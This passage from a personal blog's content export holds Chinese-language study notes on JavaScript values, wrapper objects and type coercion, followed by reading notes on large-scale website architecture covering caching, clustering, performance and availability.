class=\"headerlink\" title=\"值和引用\"></a>值和引用</h4><p>null，undefined，字符串，数字，布尔，symbol都是简单值<br>对象，函数都是复杂值<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(x) &#123;</span><br><span class=\"line\">\tx.push(4);\t</span><br><span class=\"line\">\tx;\t\t\t\t\t\t\t// [1,2,3,4]</span><br><span class=\"line\">\tx = [4,5,6];</span><br><span class=\"line\">\tx.push(7);</span><br><span class=\"line\">\tx;\t\t\t\t\t\t\t// [4,5,6,7]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = [1,2,3];</span><br><span class=\"line\">foo(a);</span><br><span class=\"line\">a;\t\t\t\t// [1,2,3,4]</span><br><span class=\"line\">由于一开始是引用赋值，然后x是a对应数组的一个引用，x在push一个4之后，重新引用一个新的数组，4.5.6,而a引用的数组变化成了[1,2,3,4];</span><br><span class=\"line\">function foo(x)&#123;</span><br><span class=\"line\">\tx.push(4);</span><br><span class=\"line\">\tx;\t\t\t\t// [1,2,3,4]</span><br><span class=\"line\">\tx.length = 0;\t</span><br><span class=\"line\">\tx.push(4,5,6,7)</span><br><span class=\"line\">\tx;\t\t\t\t// [4,5,6,7]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = [1,2,3]</span><br><span class=\"line\">foo(a)</span><br><span class=\"line\">a;\t\t// [4,5,6,7]</span><br><span class=\"line\">和上面一开始一样，只是后面在x.length=0后，再push进去了4,5,6,7。所以x的引用没变，还是和a引用的一样。所以a和x一同变化</span><br></pre></td></tr></table></figure><p></p><p><em>ps：我们无法自行决定使用值赋值还是引用赋值，一切由值的类型决定</em><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(warpper)&#123;</span><br><span class=\"line\">\twarpper.a = 42</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta: 1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(obj)</span><br><span class=\"line\">obj.a\t\t\t//42</span><br><span class=\"line\">function foo (x) &#123;</span><br><span class=\"line\">\tx = x+1;</span><br><span class=\"line\">\tx;\t\t\t\t// 3</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = 2;</span><br><span class=\"line\">var b = new Number(a);</span><br><span class=\"line\">foo(b)</span><br><span class=\"line\">console.log(b)\t\t// 2</span><br><span class=\"line\">前者是引用赋值，后者是值赋值</span><br></pre></td></tr></table></figure><p></p><h4 id=\"原生函数\"><a href=\"#原生函数\" class=\"headerlink\" title=\"原生函数\"></a>原生函数</h4><ul><li>String</li><li>Number</li><li>Boolean</li><li>Array</li><li>Object</li><li>Function</li><li>RegExp</li><li>Date</li><li>Error</li><li>Symbol</li></ul><h4 id=\"内部属性-Class\"><a href=\"#内部属性-Class\" class=\"headerlink\" title=\"内部属性[[Class]]\"></a>内部属性[[Class]]</h4><p>所有typeof返回值为“Object”的对象(如数组)都包含一个内部属性[[Class]]，这个属性通常无法直接访问，一般通过Object.prototype.toString查看<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.prototype.toString.call([123])\t\t\t// &quot;[object Array]&quot;</span><br><span class=\"line\">Object.prototype.toString.call(null)\t\t\t// &quot;[object Null]&quot;</span><br><span class=\"line\">Object.prototype.toString.call(true)\t\t\t// &quot;[object Boolean]&quot;</span><br><span class=\"line\">Object.prototype.toString.call(undefined)\t// &quot;[object Undefined]&quot;</span><br></pre></td></tr></table></figure><p></p><p>虽然Null和undefined这样的原声构造函数不存在，但是内部Class属性值仍然是Null和Undefined。基本类型值被各自的封装对象自动包装，所以他们的内部[[Class]]属性值为Boolean。</p><h4 id=\"封装对象包装\"><a href=\"#封装对象包装\" class=\"headerlink\" title=\"封装对象包装\"></a>封装对象包装</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = &quot;abc&quot;;</span><br><span class=\"line\">console.log(a);\t\t// &quot;abc&quot;</span><br><span class=\"line\">a.length \t\t\t\t\t// &quot;3&quot;</span><br><span class=\"line\">var b = new String(&quot;abc&quot;)</span><br><span class=\"line\">console.log(b)\t\t// String &#123;[[PrimitiveValue]]: &quot;abc&quot;&#125; 0:&quot;a&quot; 1:&quot;b&quot; 2:&quot;c&quot; length:3 __proto__:String [[PrimitiveValue]]:&quot;abc&quot;</span><br></pre></td></tr></table></figure><p>只是创建字面量基本值的时候，并没有其他的方法。当在使用其对象方法时，需要通过封装对象才能访问，此时js会自动为基本类型值包装(box或者wrap)一个封装对象。<br>但是为经常用到的.length方法直接new一个对象也不是一个好办法，因为浏览器对.length这样的常见情况做了优化，直接使用封装对象来“提前优化”反而会降低执行效率。</p><h4 id=\"封装对象的释疑\"><a href=\"#封装对象的释疑\" class=\"headerlink\" title=\"封装对象的释疑\"></a>封装对象的释疑</h4><p>例如：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = new Boolean(false);</span><br><span class=\"line\">if (!a)&#123;</span><br><span class=\"line\">\tconsole.log(...)\t\t\t// 执行不到这里</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>因为建立一个a之后，这个对象得到的是真值，得到的结果和使用false相反</p><p>自行封装可以使用Object<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = &quot;abc&quot;</span><br><span class=\"line\">var b = new String (a);</span><br><span class=\"line\">var c = Object(a);</span><br><span class=\"line\">typeof a \t\t\t\t// &quot;stirng&quot;</span><br><span class=\"line\">typeof b\t\t\t\t// &quot;object&quot;</span><br><span class=\"line\">typeof c\t\t\t\t// &quot;object&quot;</span><br><span class=\"line\">b instanceof String \t// true</span><br><span class=\"line\">c instanceof String \t// true</span><br><span class=\"line\">Object.prototype.toString.call(b);\t\t// &quot;[object String]&quot;</span><br><span class=\"line\">Object.prototype.toString.call(c);\t\t// &quot;[object String]&quot;</span><br></pre></td></tr></table></figure><p></p><p>一般不直接使用封装对象，但是他们偶尔也会派上用场</p><h4 id=\"拆封\"><a href=\"#拆封\" class=\"headerlink\" title=\"拆封\"></a>拆封</h4><p>如果想得到封装对象里面的值，可以使用valueOf函数，隐式拆封也是调用了valueOf函数：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = new String(&quot;abc&quot;)</span><br><span class=\"line\">var b = new Number(11)</span><br><span class=\"line\">var c = new Boolean(true)</span><br><span class=\"line\">a.valueOf()\t// &quot;abc&quot;</span><br><span class=\"line\">b.valueOf()\t// 11</span><br><span class=\"line\">c.valueOf()\t// true</span><br><span class=\"line\">var d = a + &quot;&quot;;</span><br><span class=\"line\">console.log(d)\t\t\t\t// &quot;abc&quot;</span><br><span class=\"line\">typeof a \t\t\t// &quot;object&quot;</span><br><span class=\"line\">typeof d \t\t\t// &quot;string&quot;</span><br></pre></td></tr></table></figure><p></p><h4 id=\"原生函数作为构造函数\"><a href=\"#原生函数作为构造函数\" class=\"headerlink\" title=\"原生函数作为构造函数\"></a>原生函数作为构造函数</h4><p>四种方式创建应该尽量避免构造函数，除非十分必要</p><ul><li>array 数组</li><li>object 对象</li><li>function 函数</li><li>RegExp 正则表达式<h3 id=\"ARRAY\"><a href=\"#ARRAY\" class=\"headerlink\" title=\"ARRAY(..)\"></a>ARRAY(..)</h3>调用Array构造函数时，可以不需要加上new，效果一致。）且Array构造函数纸袋一个数字作为参数的时候，这个参数会当作数组的预设长度，而不是充当其中的一个元素<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 效果一致</span><br><span class=\"line\">var a = new Array(1,2,3);</span><br><span class=\"line\">a\t\t\t// [1,2,3]</span><br><span class=\"line\">var b = Array(1,2,3)</span><br><span class=\"line\">b \t\t// [1,2,3]</span><br><span class=\"line\">var c = [1,2,3]</span><br><span class=\"line\">c \t\t// [1,2,3]</span><br><span class=\"line\">// 不同方式创建出来空数组效果不一致</span><br><span class=\"line\">var d = new Array(3);</span><br><span class=\"line\">console.log(d)\t\t\t// chrome上： (3) [empty × 3]</span><br><span class=\"line\">d.length\t\t\t\t\t\t// 3</span><br><span class=\"line\">var e = [undefined,undefined,undefined];</span><br><span class=\"line\">console.log(e)\t\t\t// (3) [undefined, undefined, undefined]</span><br><span class=\"line\">var f = []\t\t\t\t\t</span><br><span class=\"line\">f.length = 3;</span><br><span class=\"line\">console.log(f);\t\t\t// chrome上： (3) [empty × 3]</span><br><span class=\"line\">// 直接以，创建。虽然长度是3令人费解，但是可以更好的复制粘贴</span><br><span class=\"line\">var g = [,,,]</span><br><span class=\"line\">console.log(g)\t\t\t// chrome上： (3) [empty × 3]</span><br></pre></td></tr></table></figure></li></ul><p>由于创建方式不同，导致在chrome下不一致的显示，但是更难过的是，他们有时相同，有时呵呵<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = new Array(3)</span><br><span class=\"line\">var b = [undefined,undefined,undefined]</span><br><span class=\"line\">a.join(&quot;-&quot;)\t\t\t// &quot;--&quot;</span><br><span class=\"line\">b.join(&quot;-&quot;)\t\t\t// &quot;--&quot;</span><br><span class=\"line\">a.map(function(v,i)&#123;return i&#125;)\t\t// (3) [empty × 3]</span><br><span class=\"line\">a.map(function(v,i)&#123;return i&#125;)\t\t// [0, 1, 2]</span><br></pre></td></tr></table></figure><p></p><p>a.map之所以执行失败，是因为a中是没有元素的，而b里面有undefied。<br><strong>而join首先假定数组不为空，然后通过length属性值来便利其中的元素，而map并不做这种假定</strong><br>可以通过这种方式来创建包含undefined单元的数组<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = Array.apply(null, &#123;length:3&#125;);</span><br><span class=\"line\">console.log(a)\t\t\t// (3) [undefined, undefined, undefined]</span><br></pre></td></tr></table></figure><p></p><p><em>PS:永远不要创建和使用空单元数组</em></p><h4 id=\"OBJECT、FUNCTION、REGEXP\"><a href=\"#OBJECT、FUNCTION、REGEXP\" class=\"headerlink\" title=\"OBJECT、FUNCTION、REGEXP\"></a>OBJECT、FUNCTION、REGEXP</h4><p><strong>除非玩不得已，尽量不要使用他们</strong><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var c = new Object();</span><br><span class=\"line\">c.foo = &quot;bar&quot;;</span><br><span class=\"line\">c\t\t\t\t// &#123;foo:&quot;bar&quot;&#125;</span><br><span class=\"line\">var d = &#123;foo:&quot;bar&quot;&#125;</span><br><span class=\"line\">d\t\t\t\t// &#123;foo:&quot;bar&quot;&#125;</span><br><span class=\"line\">var e = new Function(&quot;a&quot;,&quot;return a * 2&quot;);</span><br><span class=\"line\">var f = function(a)&#123;return a*2&#125;;</span><br><span class=\"line\">function g(a)&#123;return a*2&#125;</span><br><span class=\"line\">var h = new RegExp(&quot;^a*b+&quot;,&quot;g&quot;);</span><br><span class=\"line\">var i = /^a*b+/g</span><br></pre></td></tr></table></figure><p></p><p>javascript对常量形式的代码会对他们进行预编译和缓存！</p><h4 id=\"DATE、ERROR\"><a href=\"#DATE、ERROR\" class=\"headerlink\" title=\"DATE、ERROR\"></a>DATE、ERROR</h4><p>相较于其他原生构造函数，Date、Error的用处比其他的更多，因为没有其他对用的常量形式来作为他们的替代<br>引入生成当前时间戳，使用<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Date.now()</span><br><span class=\"line\">// 使用new来生成时间</span><br><span class=\"line\">new Date()</span><br><span class=\"line\">// Thu Jan 04 2018 06:47:59 GMT+0800 (CST)</span><br></pre></td></tr></table></figure><p></p><p>错误对象通常与throw一起使用<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(x)&#123;</span><br><span class=\"line\">\tif(!x)&#123;</span><br><span class=\"line\">\t\tthrow new Error(&quot;///&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// -</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h4 id=\"SYMBOL\"><a href=\"#SYMBOL\" class=\"headerlink\" title=\"SYMBOL\"></a>SYMBOL</h4><p>Symbol可作为私有属性是一种简单标量基本类型</p><h3 id=\"强制类型转换\"><a href=\"#强制类型转换\" class=\"headerlink\" title=\"强制类型转换\"></a>强制类型转换</h3><h4 id=\"抽象值操作\"><a href=\"#抽象值操作\" class=\"headerlink\" title=\"抽象值操作\"></a>抽象值操作</h4><p>如果对象有自己的toString()方法，字符串化就会调用该方法并使用其返回值。<br>数组的默认toString方法经过了重新定义<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = [1,2,3]</span><br><span class=\"line\">a.toString()\t\t// &quot;1,2,3&quot;</span><br></pre></td></tr></table></figure><p></p><h4 id=\"JSON-字符串化\"><a href=\"#JSON-字符串化\" class=\"headerlink\" title=\"JSON 字符串化\"></a>JSON 字符串化</h4><p>JSON.stringify(42) // “42”<br>JSON.stringify(“42”) // “”42””<br>JSON.stringify(null) // “null”<br>JSON.stringify(true) // “true”</p><p><em>JSON.stringify()在对象中遇到undefined、function和symbol时会自动将其忽略，在数组中则会返回null</em><br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.stringify(undefined)\t\t\t// undefined</span><br><span class=\"line\">JSON.stringify(function()&#123;&#125;)\t// undefined</span><br><span class=\"line\">JSON.stringify([1,undefined, function()&#123;&#125;,4])\t// &quot;[1,null,null,4]&quot;</span><br><span class=\"line\">JSON.stringify(&#123;a:2, b: function()&#123;&#125;&#125;)\t\t\t\t// &quot;&#123;&quot;a&quot;:2&#125;&quot;</span><br></pre></td></tr></table></figure><p></p><p>循环引用会出错<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var o = &#123;&#125;;</span><br><span class=\"line\">var a = &#123;</span><br><span class=\"line\">\tb:42,</span><br><span class=\"line\">\tc:o,</span><br><span class=\"line\">\td:function()&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">o.e = a</span><br><span class=\"line\">JSON.stringify(a)</span><br><span class=\"line\">a.toJSON=function()&#123;</span><br><span class=\"line\">\treturn &#123;b:this.b&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">JSON.stringify(a)</span><br><span class=\"line\"># Uncaught TypeError: Converting circular structure to JSON</span><br><span class=\"line\">#     at JSON.stringify (&lt;anonymous&gt;)</span><br><span class=\"line\">#     at &lt;anonymous&gt;:8:6</span><br></pre></td></tr></table></figure><p></p>"},{"title":"《大型网站技术架》读书笔记","date":"2019-03-31T12:28:25.000Z","dir":"随笔","keywords":"大型网站技术架","_content":"\n拜读本书后，发现架构师一职所需要承担的职责不仅仅是那么简单，他肩负着一个网站的高可用、高并发等稳定职责。也让我受益匪浅，了解许多行内知识。\n\n### 大型网站系统特点\n\n* 高并发、大流量\n* 高可用\n* 海量数据\n* 用户分布广泛，网络情况复杂\n* 安全环境恶劣\n* 需求快速变更、发布频繁\n* 渐进式发展\n\n\n\n## 大型网站架构演化及发展历程\n\n##### 初期网站\n\n![初期应用服务器](websiteInit.jpeg)\n\n##### 最终架构的大型网站\n\n![业务及使用nosql](websiteDisAppAndUseTec.jpeg)\n\n### 演化过程\n\n* 应用服务器和数据服务器分离：应用有单独的应用服务器，数据有单独的数据服务器，文件有单独的文件服务器\n* 添加缓存：增加本地缓存及分布式缓存，使得数据库查询的部分查询可以使用缓存查询\n* 使用服务器集群：将单一服务器处理变成服务器集群处理，提升处理能力\n* 数据库读写分离：主从数据库分别负责写、读功能，主数据库写入数据，主数据库服务器将数据写入从数据库\n* 使用反向代理和CDN加速：CDN和反向代理的基本原理都是缓存，CDN可以使最近的机房提供给最近的用户，反向代理服务器若缓存过先前从中心机房给用户的数据，则将数据返回给用户\n* 使用分布式文件管理系统及分布式数据库系统：分布式数据库及分布式文件是拆分网站最后不得已的手段，将不同业务存放在不同物理机上\n* 使用NoSQL和搜索引擎：NoSQL和搜索引擎都是源自于互联网技术的手段，对于可伸缩的分布式特性有更好的支持\n* 业务拆分：将不同业务分在不同产品线，每个应用独立部署\n* 分布式服务：将不同服务的相同业务提取出来，将可复用的业务提供业务数据库连接及提供业务服务\n\n### 网站架构误区\n\n* 一味追求大公司解决方案：应针对自身业务提供解决方案，而非一味追求大公司解决方案\n* 为了技术而技术：网站技术是为业务而存在的，除此之外毫无意义\n* 企图用技术解决所有问题：技术是用来解决业务问题的，而业务问题也可以通过业务解决。例如12306，分时间抢票比同时间抢票更加技术上更容易实现，且系统更加稳定\n\n## 大型网站架构模式\n\n#### 分层\n\n![分层](hierarchy.jpeg)\n\n大型网站中架构也分层，将网站软件系统氛围应用层、服务层、数据层。\n\n分层架构的目的：规划软件清晰的逻辑结构便于开发维护，但在网站的发展过程中，分层结构对网站支持高并发向分布式方向发展至关重要。因此应该在网站很小的时候采用分层架构\n\n分层架构带来的挑战：必须合理规划层次边界和接口，在开发过程中，严格遵循分层架构的约束，禁止跨层次的调用（应用层直接调用数据层）及逆向调用（数据层调用服务层，或者服务层调用应用层）\n\n#### 分割\n\n如果说分层是对软件的横向切割，那么分割是纵向切割\n\n网站越大，功能越复杂，服务和数据处理的种类也越多，将这些不同的功能和服务分割开来，包装成高内聚低耦合的模块单元，一方面有助于软件的开发和维护；另一方面，便于不同模块的分布式部署，提高网站的并发处理能力和功能扩展能力。\n\n大型网站分割的粒度可能会很小。比如在应用层，将不同业务进行分割，例如将购物、论坛、搜索、广告分割成不同的应用，由独立的团队负责，部署在不同的服务器上；在同一个应用内部，如果规模庞大业务复杂，会继续进行分割，比如购物业务，可以进一步分割成机票酒店业务、3C业务等\n\n#### 分布式\n\n* 分布式应用和服务： 可以改善网站性能和并发性、加快开发和发布速度、减少数据库连接资源消耗外；还可以使不同应用复用共同的服务，便于业务功能扩展\n* 分布式静态资源：网站的静态资源例如js、css、image等静态资源可以独立分布部署，并采用独立资源。可以减轻应用服务器压力\n* 分布式数据及存储：单台机器无法提供海量存储\n* 分布式计算：目前网站大部分使用Hadoop及其MapReduce分布式计算框架使用处理计算。\n* 分布式配置，分布式锁，分布式文件等\n\n#### 集群\n\n多台服务器可成一个集群，通过负载均衡对外提供服务，通过负载均衡新增或更替机器\n\n#### 缓存\n\n缓存就是将数据存放在距离计算最近的位置以加快处理速度。缓存是改善软件性能的第一手段\n\n* CDN：可以缓存一些较少变化数据，如视频文件等，可以就近迅速返还给用户\n* 反向代理：当用户请求到达中心时，最先访问反向代理服务器，这里缓存的是静态资源，无需转应用服务器就可返回给用户\n* 本地缓存：缓存着热点数据，无需访问数据库直接可以取到，相比缓存服务器更迅速\n* 分布式缓存：网站数据十分庞大时，本地缓存无法解决问题。\n\n使用缓存有两个前提条件，一是数据访问热点不均衡，某些数据会被更频繁的访问，这些数据应该放在缓存中；二是数据在某个时间段内有效，不会很快过期，否则缓存的数据就会因已经失效而产生脏读，影响结果的正确性\n\n#### 异步\n\n* 提高系统可用性：消费者服务器发生故障，数据会在消息队列服务器中存储堆积，生产者服务器可以继续处理业务请求，系统整体表现无故障\n* 加快网站响应速度：处理完业务数据请求后，不需要等待消费者服务器处理就可以返回，直接写入消息队列，响应延迟减少\n* 消除并发高峰：将请求放入消息队列中依次处理，就不对对整个网站负载造成过大压力\n\n#### 冗余\n\n网站应该实现数据的冷备份外，还有热备份。即定时保存和实时保存数据，以及灾备数据中心。避免由于单个服务器损坏后数据损坏。\n\n#### 自动化\n\n网站发布应该具备以下环节\n\n* 发布自动化\n* 代码管理：版本控制\n* 自动化测试：自动检测并发送检测报告\n* 自动化安全检测：对代码进行静态安全扫描部署及攻击测试\n* 自动化部署：自动部署到生产环境\n* 自动化监控：监控服务器宕机，程序bug，存储空间不足，突然访问高峰\n* 自动化报警：超出阈值发送邮件报警\n* 自动化失效转移：将失效的服务器从集群隔离\n* 自动化失效恢复：重新启动服务\n* 自动化降级：访问高峰则关闭次要服务\n* 自动化分配资源：将空闲资源合理分配给重要任务\n\n#### 安全\n\n* 密码和手机校验\n* 通信加密\n* 验证码识别\n* 敏感词汇过滤\n* 风险信息控制\n\n## 架构要素\n\n通俗说法：最高层次的规划，难以改变的决定\n\n一般说来，除了当前的系统功能需求外，软件架构还需要关注性能、可用性、伸缩性、扩展性和安全性这5个架构要素\n\n* 性能：衡量网站性能有一系列指标，重要的有响应时间、TPS、系统性能计数器等\n* 可用性：大型网站至少到99.99%，衡量一个系统架构设计是否满足高可用的目标，就是假设系统中任何一台或者多台服务器宕机时，以及出现各种不可预期的问题时，系统整体是否依然可用\n* 伸缩性：衡量架构伸缩性的主要标准就是是否可以用多台服务器构建集群，是否容易向集群中添加新的服务器。加入新的服务器后是否可以提供和原来的服务器无差别的服务。集群中可容纳的总的服务器数量是否有限制\n* 扩展性：衡量网站架构扩展性好坏的主要标准就是在网站增加新的业务产品时，是否可以实现对现有产品透明无影响，不需要任何改动或者很少改动既有业务功能就可以上线新产品\n* 安全性：衡量网站安全架构的标准就是针对现存和潜在的各种攻击与窃密手段，是否有可靠的应对策略\n\n## 网站的高性能架构\n\n#### 不同视角下的性能\n\n* 用户视角的网站性能：从用户角度，网站性能就是用户在浏览器上直观感受到的网站响应速度快还是慢。用户感受到的时间，包括用户计算机和网站服务器通信的时间、网站服务器处理的时间、用户计算机浏览器构造请求解析响应数据的时间\n* 开发人员角度的网站性能：是应用程序本身及其相关子系统的性能，包括响应延迟、系统吞吐量、并发处理能力、系统稳定性等技术指标。主要的优化手段有使用缓存加速数据读取，使用集群提高吞吐能力，使用异步消息加快请求响应及实现削峰，使用代码优化手段改善程序性能\n* 运维角度的网站性能：关注基础设施性能和资源利用率，如网络运营商的带宽能力、服务器硬件的配置、数据中心网络架构、服务器和网络带宽的资源利用率等。主要优化手段有建设优化骨干网、使用高性价比定制服务器、利用虚拟化技术优化资源利用等\n\n#### 性能优化策略\n\n* 性能分析：检查请求处理的各个环节的日志，分析哪个环节响应时间不合理、超过预期；然后检查监控数据，分析影响性能的主要因素是内存、磁盘、网络、还是CPU，是代码问题还是架构设计不合理\n* 性能优化：根据分层架构可分为web前端优化、应用服务器性能优化、存储服务器性能优化\n\n#### 前端优化策略\n\n* 减少http请求\n* 使用浏览器缓存\n* 启动压缩\n* css放在最上面，js放在页面最下面\n* 减少cookie传输\n\n#### CDN加速\n\nCDN能够缓存的一般是静态资源，如图片、文件、CSS、Script脚本、静态网页等，但是这些文件访问频度很高，将其缓存在CDN可极大改善网页的打开速度\n\n#### 反向代理\n\n传统代理服务器位于浏览器一侧，代理浏览器将HTTP请求发送到互联网上，而反向代理服务器位于网站机房一侧，代理网站Web服务器接收HTTP请求\n\n#### 缓存\n\n* 基本原理： K-V形式存储\n* 合理使用缓存：数据读写比2:1以上使用缓存才有意义\n* 数据不一致与脏读：需要设置缓存时间，在缓存时间内可接受脏读\n* 缓存可用性：数据库在面临缓存失效时容易出现访问过大导致宕机\n* 缓存预热：提前加载缓存保证缓存可用\n* 缓存穿透：将value为null的情况也加载在缓存中\n\n#### 代码优化\n\n* 多线程：使用多线程处理IO与多cpu一般算法：多线程数=[任务执行时间/(任务执行时间-IO等待时间)]* cpu内核数量\n* 将对象设计成无状态：在多并发时对象不会因多线程导致状态改变\n* 使用局部对象：在方法内创建对象\n* 并发访问使用锁：锁将并发操作转化为顺序操作\n* 资源复用：使用单例模式和对象池\n* 数据结构：使用数据结构+算法的形式优化代码可以极大的优化性能\n* 垃圾回收：垃圾回收机制有利于性能提升\n\n## 网站高可用架构\n\n#### 网站高可用性度量\n\n网站不可用时间（故障时间）=故障修复时间点-故障发现（报告）时间点\n\n网站年度可用性指标=（1-网站不可用时间/年度总时间）×100%\n\n对于大多数网站而言，2个9是基本可用，网站年度不可用时间小于88小时；3个9是较高可用，网站年度不可用时间小于9小时；4个9是具有自动恢复能力的高可用，网站年度不可用时间小于53分钟；5个9是极高可用性，网站年度不可用时间小于5分钟。\n\n#### 网站可用性考核\n\n![考核](useWeight.jpeg)\n\n故障分=故障时间（分钟）× 故障权重\n\n#### 高可用的服务\n\n* 服务器分级：将服务器分不同级别，核心应用和服务优先使用更好的服务器\n* 超时设置：由于宕机或死锁等其他情况，超时后可设置调度到其他服务器\n* 异步调用：异步调用减少服务器压力\n* 服务降级：高峰期使用服务器降级，拒绝服务（拒绝部分请求）或关闭服务（关闭非核心服务）\n* 幂等性设计：服务层必须保证多次调用和一次调用结果一致\n\n#### 数据可用性\n\n* 数据持久性： 多个副本，在某个存储出错后数据不会丢失\n* 数据可访问性：切换数据源时用户无感知\n* 数据一致性：不同副本保证数据一致\n\n#### 网站运行监控\n\n不允许没有监控的系统上线\n\n* 用户行为日志收集\n* 服务器端日志收集\n* 客户端浏览器日志收集\n* 服务器性能监控\n* 运行数据报告\n\n##### 小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。\n\n","source":"_posts/《大型网站技术架》读书笔记.md","raw":"---\ntitle: 《大型网站技术架》读书笔记\ndate: 2019-03-31 20:28:25\ntags: 随笔\ndir: 随笔\nkeywords: 